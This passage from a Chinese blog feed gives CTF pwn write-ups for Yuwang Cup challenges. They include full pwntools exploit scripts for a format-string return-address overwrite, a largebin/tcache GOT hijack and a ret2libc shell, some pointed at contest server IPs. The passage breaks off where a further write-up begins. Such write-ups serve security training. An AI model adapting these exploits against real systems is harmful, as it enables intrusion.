id="normal-pwn"><a href="#normal-pwn" class="headerlink" title="normal pwn"></a>normal pwn</h3><p>看名字就知道可能是异架构</p><p>Checksec 检查保护</p><p><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211425781-87702960.png" alt="img"></p><p><strong>Arrch架构，保护全开</strong></p><p><strong>Ida逆向一下</strong></p><p><strong>初看是一个堆题目</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211443008-1941927601.png" alt="img"></strong></p><p><strong>上来给了stderr地址，那么可以得到elf的基地址</strong></p><p><strong>Show函数没有格式化，存在格式化字符串漏洞</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211503734-1970320076.png" alt="img"></strong></p><p><strong>同样存在后门</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211517291-490240130.png" alt="img"></strong></p><p><strong>那么思路很清晰通过格式化字符串泄露stack地址，然后再修改返回地址为后门</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211531065-2134714163.png" alt="img"></strong></p><p><strong>效果如下</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211548884-502778508.png" alt="img"></strong></p><p><strong>EXP：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br><span class="hljs-number">2.</span><br><span class="hljs-number">3.</span>con(<span class="hljs-string">&quot;aarch64&quot;</span>)<br><span class="hljs-number">4.</span><br><span class="hljs-number">5.</span><span class="hljs-comment">#io = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;./pfdata&quot;])</span><br><span class="hljs-number">6.</span><span class="hljs-comment">#io =process(&quot;./pfdata&quot;)</span><br><span class="hljs-number">7.</span>io = remote(<span class="hljs-string">&quot;101.200.58.4&quot;</span>,<span class="hljs-number">5555</span>)<br><span class="hljs-number">8.</span><br><span class="hljs-number">9.</span>elf = ELF(<span class="hljs-string">&quot;./pfdata&quot;</span>)<br><span class="hljs-number">10.</span>io.recvuntil(<span class="hljs-string">&quot;stderr &quot;</span>)<br><span class="hljs-number">11.</span>base = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x12128</span> <br><span class="hljs-number">12.</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br><span class="hljs-number">13.</span>    io.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;97&#x27;</span>)<br><span class="hljs-number">14.</span>    io.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-number">15.</span>    io.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-number">16.</span><br><span class="hljs-number">17.</span><br><span class="hljs-number">18.</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br><span class="hljs-number">19.</span>    io.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;115&#x27;</span>)<br><span class="hljs-number">20.</span>    io.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-number">21.</span><br><span class="hljs-number">22.</span><br><span class="hljs-number">23.</span><br><span class="hljs-number">24.</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,msg</span>):<br><span class="hljs-number">25.</span>    io.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;101&#x27;</span>)<br><span class="hljs-number">26.</span>    io.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-number">27.</span>    io.sendafter(<span class="hljs-string">&quot;content: &quot;</span>,msg)<br><span class="hljs-number">28.</span><br><span class="hljs-number">29.</span><br><span class="hljs-number">30.</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>)<br><span class="hljs-number">31.</span>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;%9$p&quot;</span>)<br><span class="hljs-number">32.</span>show(<span class="hljs-number">0</span>)<br><span class="hljs-number">33.</span>io.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br><span class="hljs-number">34.</span>elf_base = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) -<span class="hljs-number">0xea0</span><br><span class="hljs-number">35.</span>suc(<span class="hljs-string">&quot;elf_base&quot;</span>,elf_base)<br><span class="hljs-number">36.</span>backdoor = elf_base + <span class="hljs-number">0xd40</span><br><span class="hljs-number">37.</span>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;%8$p&quot;</span>)<br><span class="hljs-number">38.</span>show(<span class="hljs-number">0</span>)<br><span class="hljs-number">39.</span>io.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br><span class="hljs-number">40.</span>ret =  <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) -<span class="hljs-number">0x18</span><br><span class="hljs-number">41.</span>payload = <span class="hljs-string">b&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(ret&amp;<span class="hljs-number">0xffff</span>).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)+<span class="hljs-string">b&quot;c%8$hn&quot;</span><br><span class="hljs-number">42.</span>edit(<span class="hljs-number">0</span>,payload)<br><span class="hljs-number">43.</span>show(<span class="hljs-number">0</span>)<br><span class="hljs-number">44.</span><br><span class="hljs-number">45.</span>payload = <span class="hljs-string">b&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(backdoor&amp;<span class="hljs-number">0xffff</span>).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)+<span class="hljs-string">b&quot;c%12$hn&quot;</span><br><span class="hljs-number">46.</span>edit(<span class="hljs-number">0</span>,payload)<br><span class="hljs-number">47.</span>show(<span class="hljs-number">0</span>)<br><span class="hljs-number">48.</span><br><span class="hljs-number">49.</span>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211622267-1914371752.png" alt="img"></p><h3 id="no-fmtstr"><a href="#no-fmtstr" class="headerlink" title="no fmtstr"></a>no fmtstr</h3><p>Checkse检查保护</p><p><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211647044-884604567.png" alt="img"></p><p><strong>没有开pie和got全保护</strong></p><p><strong>64位ida逆向</strong></p><p><strong>是个堆题目，先把函数名改了</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211711115-142382515.png" alt="img"></strong></p><p><strong>申请堆块有限制，大小在largebin范围内</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211721570-1731421033.png" alt="img"></strong></p><p><strong>Free函数存在UAF</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211735683-21966482.png" alt="img"></strong></p><p><strong>存在后门</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211748937-2009345695.png" alt="img"></strong></p><p><strong>还有一点就是做了检查，导致不能伪造stderr等结构体</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211808239-897879715.png" alt="img"></strong></p><p><strong>那么可以通过largebin泄露 libc和heap地址，然后通过largebin attack 修改 mp_结构体，那么就可以free chunk进入到tcachebin里面，然后劫持指针修改got表</strong></p><p><strong>这里发现从write 或者setbuf的got开始修改效果好一点，不然可能由于地址问题会报错，期间会覆盖system got表，注意不要覆盖了。</strong></p><p><strong><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211821307-1967505038.png" alt="img"></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br><span class="hljs-number">2.</span><br><span class="hljs-number">3.</span>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><span class="hljs-number">4.</span>io = process(<span class="hljs-string">&quot;./fmt&quot;</span>)<br><span class="hljs-number">5.</span><span class="hljs-comment">#io = remote(&quot;101.200.58.4&quot;,2222)</span><br><span class="hljs-number">6.</span>libc =ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-number">7.</span><br><span class="hljs-number">8.</span><br><span class="hljs-number">9.</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br><span class="hljs-number">10.</span>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-number">11.</span>    io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-number">12.</span>    io.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-number">13.</span><br><span class="hljs-number">14.</span><br><span class="hljs-number">15.</span><br><span class="hljs-number">16.</span><br><span class="hljs-number">17.</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br><span class="hljs-number">18.</span>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br><span class="hljs-number">19.</span>    io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-number">20.</span><br><span class="hljs-number">21.</span><br><span class="hljs-number">22.</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,msg</span>):<br><span class="hljs-number">23.</span>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br><span class="hljs-number">24.</span>    io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-number">25.</span>    io.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,msg)<br><span class="hljs-number">26.</span><br><span class="hljs-number">27.</span><br><span class="hljs-number">28.</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br><span class="hljs-number">29.</span>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br><span class="hljs-number">30.</span>    io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-number">31.</span><br><span class="hljs-number">32.</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x540</span>) <br><span class="hljs-number">33.</span>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x528</span>)<br><span class="hljs-number">34.</span>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x530</span>)<br><span class="hljs-number">35.</span>free(<span class="hljs-number">0</span>)<br><span class="hljs-number">36.</span>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x550</span>)<br><span class="hljs-number">37.</span>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-number">38.</span><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-number">39.</span>show(<span class="hljs-number">0</span>)<br><span class="hljs-number">40.</span>io.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br><span class="hljs-number">41.</span>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x61</span> - <span class="hljs-number">0x1f7100</span><br><span class="hljs-number">42.</span>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><span class="hljs-number">43.</span>stderr = libc_base + libc.sym[<span class="hljs-string">&quot;stderr&quot;</span>]<br><span class="hljs-number">44.</span>system = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br><span class="hljs-number">45.</span>mp_ = libc_base + <span class="hljs-number">0x1F63B0</span><br><span class="hljs-number">46.</span>suc(<span class="hljs-string">&quot;mp_&quot;</span>,mp_)<br><span class="hljs-number">47.</span>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><span class="hljs-number">48.</span>show(<span class="hljs-number">0</span>)<br><span class="hljs-number">49.</span>io.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br><span class="hljs-number">50.</span>heap_base = u32(io.recv(<span class="hljs-number">4</span>)) -<span class="hljs-number">0x290</span><br><span class="hljs-number">51.</span>suc(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><span class="hljs-number">52.</span><br><span class="hljs-number">53.</span>payload = p64(heap_base + <span class="hljs-number">0x290</span>)*<span class="hljs-number">2</span> + p64(libc_base + <span class="hljs-number">0x1f7100</span>) + p64(mp_ -<span class="hljs-number">1</span> -<span class="hljs-number">0x20</span>)<br><span class="hljs-number">54.</span>edit(<span class="hljs-number">0</span>,payload)<br><span class="hljs-number">55.</span>free(<span class="hljs-number">2</span>)<br><span class="hljs-number">56.</span>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x560</span>)<br><span class="hljs-number">57.</span>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x560</span>)<br><span class="hljs-number">58.</span>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x560</span>)<br><span class="hljs-number">59.</span>edit(<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<br><span class="hljs-number">60.</span>edit(<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<br><span class="hljs-number">61.</span>free(<span class="hljs-number">5</span>)<br><span class="hljs-number">62.</span>free(<span class="hljs-number">6</span>)<br><span class="hljs-number">63.</span>key = (heap_base + <span class="hljs-number">0x2000</span>) &gt;&gt; <span class="hljs-number">0xc</span><br><span class="hljs-number">64.</span>backdoor = <span class="hljs-number">0x4011D6</span><br><span class="hljs-number">65.</span>write = <span class="hljs-number">0x404020</span><br><span class="hljs-number">66.</span>system = <span class="hljs-number">0x4010A0</span> +<span class="hljs-number">6</span><br><span class="hljs-number">67.</span>edit(<span class="hljs-number">6</span>,p64(write ^ key))<br><span class="hljs-number">68.</span>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x560</span>)<br><span class="hljs-number">69.</span>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x560</span>)<br><span class="hljs-number">70.</span><br><span class="hljs-number">71.</span>edit(<span class="hljs-number">8</span>,p64(system)*<span class="hljs-number">4</span>+p64(backdoor))<br><span class="hljs-number">72.</span><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-number">73.</span>io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br><span class="hljs-number">74.</span><br><span class="hljs-number">75.</span>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101211858694-1008237026.png" alt="img"></p>]]></content>
    
    
    
    <tags>
      
      <tag>赛题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第八届御网杯线下赛Pwn方向题解</title>
    <link href="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/"/>
    <url>/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><strong>由于最近比赛有点多，而且赶上招新，导致原本应该及时总结的比赛搁置了，总结来说还是得多练，因为时间很短像这种线下赛，一般只有几个小时，所以思路一定要清晰，我还是经验太少了，导致比赛力不从心，先鸽了~</strong></p><h2 id="Skill"><a href="#Skill" class="headerlink" title="Skill"></a><strong>Skill</strong></h2><p><strong>checksec 检查保护（没有开PIE和Canary）</strong></p><p><strong><img src="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101184118061-1275965758.png" alt="img"></strong></p><p><strong>ida逆向分析一下</strong></p><p><strong>不同的选项对应不同的功能</strong></p><p><strong><img src="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101193605782-688664173.png" alt="img"></strong></p><p><strong>漏洞存在show函数里面，当满足情况时候就会执行gets实现溢出</strong></p><p><strong><img src="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101193639949-1063911727.png" alt="img"></strong></p><p><strong>那么在add的时候使情况满足，然后ret2libc即可</strong></p><p><strong>EXP：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br><br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br><span class="hljs-comment">#io = process(&quot;./skill&quot;)</span><br>io = remote(<span class="hljs-string">&quot;3.1.26.5&quot;</span>,<span class="hljs-string">&quot;9999&quot;</span>)<br>skills = <span class="hljs-number">0x6020E0</span><br>libc = ELF(<span class="hljs-string">&quot;/home/su/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">skill</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;exit&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;skill:&quot;</span>,skill)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dell</span>():<br>    io.sendlineafter(<span class="hljs-string">&quot;exit&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list</span>():<br>    io.sendlineafter(<span class="hljs-string">&quot;exit&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    io.sendlineafter(<span class="hljs-string">&quot;exit&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><br>payload = <span class="hljs-string">b&quot;song&quot;</span> +<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">16</span> +<span class="hljs-string">b&quot;jump&quot;</span><br>payload +=<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">16</span>+ <span class="hljs-string">b&quot;rap&quot;</span> +<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">17</span>+<span class="hljs-string">b&quot;NBA&quot;</span><br>add(payload)<br><span class="hljs-comment">#io.recvuntil(&quot;exit&quot;)</span><br><span class="hljs-comment">#io.sendlineafter(&quot;5.&quot;,&#x27;1&#x27;)</span><br>pop_rdi =<span class="hljs-number">0x0000000000400c83</span><span class="hljs-comment">#: pop rdi; ret; </span><br>puts_plt = <span class="hljs-number">0x400710</span><br>puts_got = <span class="hljs-number">0x602020</span><br>start()<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(<span class="hljs-number">0x4008B6</span>) <br><span class="hljs-comment">#gdb.attach(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;music~&quot;</span>)<br>io.sendline(payload)<br>io.recv(<span class="hljs-number">1</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>system = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><br>start()<br>payload= <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>  + p64(pop_rdi+<span class="hljs-number">1</span>) + p64(pop_rdi)+ p64(binsh) + p64(system) + p64(<span class="hljs-number">0x400B61</span>)<br><span class="hljs-comment">#io.sendline(payload)</span><br><span class="hljs-comment">#io.sendline(payload)</span><br><br>io.recvuntil(<span class="hljs-string">&quot;music~&quot;</span>)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="wir"><a href="#wir" class="headerlink" title="wir"></a><strong>wir</strong></h2><p><strong>这个题目我记不清了大概是这个缩写</strong></p><p><strong>保护策略（无PIE，Canary）</strong></p><p><strong><img src="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101194352587-682071994.png" alt="img"></strong></p><p><strong>程序存在溢出</strong></p><p><strong><img src="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101194509049-973053838.png" alt="img"></strong></p><p><strong>而且存在后门</strong></p><p><strong><img src="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101194528978-1122799110.png" alt="img"></strong></p><p><strong>但是比赛的时候没有用到</strong></p><p><strong><img src="/2024/11/01/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BPwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/3419447-20241101194559693-1400673551.png" alt="img"></strong></p><p><strong>因为这里存在格式化字符串漏洞而且是通过main函数返回的，因此可以直接修改返回地址为gadget</strong></p><p><strong>EXP：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 